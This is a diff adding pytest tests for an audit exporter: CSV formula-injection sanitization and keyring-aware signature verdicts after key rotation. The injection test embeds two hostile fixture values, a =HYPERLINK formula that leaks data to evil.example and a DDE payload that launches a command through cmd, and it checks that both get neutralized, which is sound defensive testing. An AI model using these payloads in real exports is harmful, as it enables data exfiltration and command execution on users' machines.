@@ -14,9 +14,12 @@ import pytest
 
 from aistamp.audit import (
     AuditExporter,
+    build_evidence_pack,
     build_export_manifest,
     enforce_retention,
     record_to_dict,
+    sanitize_csv_cell,
+    signature_verdict,
 )
 from aistamp.config import Config
 from aistamp.fingerprint import generate_content_id, hash_content, sign_record
@@ -414,3 +417,182 @@ def test_retention_accepts_config_database_url(tmp_path: Path) -> None:
         )
         == 1
     )
+
+
+# ---------------------------------------------------------------------------
+# CSV formula injection (audit P1-7): caller-controlled fields are neutralized
+# ---------------------------------------------------------------------------
+
+
+def test_csv_neutralizes_formula_injection(tmp_path: Path) -> None:
+    # The audit's PoV payloads: =HYPERLINK exfil and =cmd DDE launch in
+    # caller-controlled user_id/app_id fields.
+    backend = _file_backend(tmp_path)
+    record = _sample_record().model_copy(
+        update={
+            "user_id": '=HYPERLINK("http://evil.example/leak","click")',
+            "app_id": "=cmd|' /C calc'!A0",
+        }
+    )
+    _write_signed(backend, record)
+    exporter = AuditExporter(backend, secret_key=_SECRET)
+    csv_out = exporter.to_csv(exporter.query(_all_filters()))
+
+    rows = list(csv.reader(io.StringIO(csv_out)))
+    cells = dict(zip(rows[0], rows[1], strict=True))
+    assert cells["user_id"].startswith("'=HYPERLINK")
+    assert cells["app_id"].startswith("'=cmd")
+    # The raw payload must not survive as a leading formula character.
+    assert not cells["user_id"].startswith("=")
+    assert not cells["app_id"].startswith("=")
+
+
+def test_sanitize_csv_cell_covers_owasp_lead_characters() -> None:
+    assert sanitize_csv_cell("=SUM(A1)") == "'=SUM(A1)"
+    assert sanitize_csv_cell("+1(555)0100") == "'+1(555)0100"
+    assert sanitize_csv_cell("-2nd floor") == "'-2nd floor"
+    assert sanitize_csv_cell("@handle") == "'@handle"
+    assert sanitize_csv_cell("\tcmd") == "'\tcmd"
+    assert sanitize_csv_cell("\r\ninject") == "'\r\ninject"
+    assert sanitize_csv_cell("safe_user") == "safe_user"
+    assert sanitize_csv_cell("") == ""
+
+
+def test_csv_preserves_numeric_cells(tmp_path: Path) -> None:
+    # Only string cells are neutralized; numbers keep their native
+    # formatting (a negative latency must not grow an apostrophe).
+    backend = _file_backend(tmp_path)
+    record = _sample_record().model_copy(update={"latency_ms": -1.5})
+    _write_signed(backend, record)
+    exporter = AuditExporter(backend, secret_key=_SECRET)
+    csv_out = exporter.to_csv(exporter.query(_all_filters()))
+
+    lines = csv_out.splitlines()
+    header = next(csv.reader(io.StringIO(lines[0])))
+    values = next(csv.reader(io.StringIO(lines[1])))
+    cells = dict(zip(header, values, strict=True))
+    assert cells["latency_ms"] == "-1.5"
+
+
+# ---------------------------------------------------------------------------
+# Keyring-aware verdicts (audit P2-12, promoted P1): rotated history must not
+# report INVALID
+# ---------------------------------------------------------------------------
+
+
+_ROTATED_KEY_ID = "k-2024-09"
+_OLD_KEY = "retired-signing-key-for-rotation-tests-32ch"
+
+
+def _rotated_record() -> ProvenanceRecord:
+    """A record signed under a retired key (rotation without re-signing).
+
+    ProvenanceRecord gains ``key_id`` with the tamper-evidence track; until
+    then model_copy carries the value the way rotate_secret's re-sign does.
+    """
+    return _sample_record().model_copy(update={"key_id": _ROTATED_KEY_ID})
+
+
+def test_rotated_history_without_keyring_reports_unverified(
+    tmp_path: Path,
+) -> None:
+    # Regression: this used to report INVALID — legitimately signed history
+    # crying wolf after a rotation masks real tampering. Keyed record stays
+    # in memory: the store round-trip cannot carry key_id until the
+    # tamper-evidence track lands the column.
+    record = _rotated_record()
+    stored = sign_record(record, _OLD_KEY)
+
+    verdict = signature_verdict(record, stored, _SECRET)
+    assert verdict == "UNVERIFIED"
+
+
+def test_rotated_history_with_keyring_reports_valid(tmp_path: Path) -> None:
+    backend = _file_backend(tmp_path)
+    record = _rotated_record()
+    stored = _write_signed(backend, record, secret=_OLD_KEY)
+    exporter = AuditExporter(
+        backend,
+        secret_key=_SECRET,
+        verification_keyring={_ROTATED_KEY_ID: _OLD_KEY, "default": _SECRET},
+    )
+
+    # Keyed record, keyring lookup by key_id hits the retired key.
+    enriched = exporter.signed_record_dict(record, stored)
+    assert enriched["signature_verdict"] == "VALID"
+
+
+def test_legacy_pre_rotation_history_verifies_via_keyring(tmp_path: Path) -> None:
+    # 0.1.x-era records (implicit default key id) signed with the
+    # pre-rotation secret round-trip through the store and verify via the
+    # keyring entry mounted at 'default', while the active key has rotated.
+    backend = _file_backend(tmp_path)
+    legacy = _sample_record()
+    _write_signed(backend, legacy, secret=_OLD_KEY)
+    exporter = AuditExporter(
+        backend,
+        secret_key=_SECRET,
+        verification_keyring={"default": _OLD_KEY},
+    )
+
+    payload = json.loads(exporter.to_json(exporter.query(_all_filters())))
+    verdicts = {
+        r["content_id"]: r["signature_verdict"] for r in payload["records"]
+    }
+    assert verdicts[legacy.content_id] == "VALID"
+
+
+def test_keyring_missing_key_reports_unverified(tmp_path: Path) -> None:
+    backend = _file_backend(tmp_path)
+    record = _rotated_record()
+    stored = _write_signed(backend, record, secret=_OLD_KEY)
+    exporter = AuditExporter(
+        backend, secret_key=_SECRET, verification_keyring={"default": _SECRET}
+    )
+
+    assert exporter._verdict(record, stored) == "UNVERIFIED"
+
+
+def test_keyring_still_detects_tampering(tmp_path: Path) -> None:
+    # A keyring must not turn real tampering into UNVERIFIED.
+    backend = _file_backend(tmp_path)
+    record = _rotated_record()
+    _write_signed(backend, record, secret=_OLD_KEY)
+    exporter = AuditExporter(
+        backend,
+        secret_key=_SECRET,
+        verification_keyring={_ROTATED_KEY_ID: _OLD_KEY},
+    )
+
+    assert exporter._verdict(record, "0" * 64) == "INVALID"
+
+
+def test_default_key_id_verdicts_unchanged(tmp_path: Path) -> None:
+    # 0.1.x records (no key_id) keep today's behavior under a keyring.
+    backend = _file_backend(tmp_path)
+    record = _sample_record()
+    stored = _write_signed(backend, record)
+    exporter = AuditExporter(
+        backend, secret_key=_SECRET, verification_keyring={"default": _SECRET}
+    )
+
+    assert exporter._verdict(record, stored) == "VALID"
+    assert exporter._verdict(record, "f" * 64) == "INVALID"
+
+
+def test_evidence_pack_uses_keyring_and_record_sig_algo() -> None:
+    record = _rotated_record()
+    stored = sign_record(record, _OLD_KEY)
+
+    pack = build_evidence_pack(
+        record,
+        stored,
+        _SECRET,
+        keyring={_ROTATED_KEY_ID: _OLD_KEY, "default": _SECRET},
+    )
+    assert pack["verification"]["signature_verdict"] == "VALID"
+    assert pack["verification"]["algorithm"] == "HMAC-SHA256"
+
+    # Without the keyring the pack must say UNVERIFIED, never INVALID.
+    unverified = build_evidence_pack(record, stored, _SECRET)
+    assert unverified["verification"]["signature_verdict"] == "UNVERIFIED"
